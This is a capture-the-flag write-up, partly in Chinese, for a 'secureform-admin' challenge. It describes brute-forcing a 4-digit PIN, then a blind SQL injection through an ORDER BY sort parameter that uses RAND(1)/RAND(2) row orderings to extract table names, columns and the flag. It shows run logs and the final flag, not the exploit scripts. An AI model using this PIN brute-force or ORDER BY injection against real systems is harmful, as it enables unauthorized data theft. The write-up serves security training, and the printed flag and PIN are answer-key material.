# secureform-admin

## 題目描述

You've discovered the admin panel of a contact form application called SecureForm. Access is protected by a 4-digit PIN... but is it really secure?

Once inside, the dashboard lists form submissions and offers sorting options. The developer tried to mimic WordPress sanitization, but something slipped through.

## 解題思路

先用 solution.js 來爆破 pin，得知 pin 是 7392

```text
Tried 7200/10000 | last 7358
[+] PIN: 7392
```

進入 /dashboard 以後可以看到 entries，並可以調整排序方式。題目有提到開發者有嘗試模仿 WordPress sanitization，但有些東西沒弄好，我猜是可以在 orderby 裡面注入 sql 語句

由於頁面不會顯示查詢結果，所以我們只能藉由 entries 的順序來判斷結果進行 sql 盲注，我是先新增 aaaaa 和 zzzzz 這兩筆 entry，接著測試 `RAND(1)` 和 `RAND(2)` 的排序差異如下，當排序為真的時候結果會等於 `RAND(1)` 的結果，反之為 `RAND(2)` 的結果

```text
[+] true sig : ('aaaaa', 'zzzzz')
[+] false sig: ('zzzzz', 'aaaaa')
```

得到這個結果以後就開始盲注，我要先得知所有的 table，得知有兩個 table，分別為 entries 和 secrets，再來是 secrets table 的欄位名稱，分別為 id 和 flag。好了以後就能開始盲注 flag 了

```text
> python .\solution.py --url https://dalctf-secureform-admin-183-64616c.instancer.dalctf2026.com/dashboard.php --pin 7392
[+] login: 200
[+] add: aaaaa 200
[+] add: zzzzz 200
[+] marker A: aaaaa
[+] marker Z: zzzzz
[+] true sig : ('aaaaa', 'zzzzz')
[+] false sig: ('zzzzz', 'aaaaa')
ctf_challenge
[+] database: ctf_challenge
entries,secrets
[+] tables: entries,secrets
id,flag
[+] secrets: id,flag
dalctf{bl1nd_sqli_0rd3r_by}
[+] flag: dalctf{bl1nd_sqli_0rd3r_by}
```

## Flag

```text
dalctf{bl1nd_sqli_0rd3r_by}
```
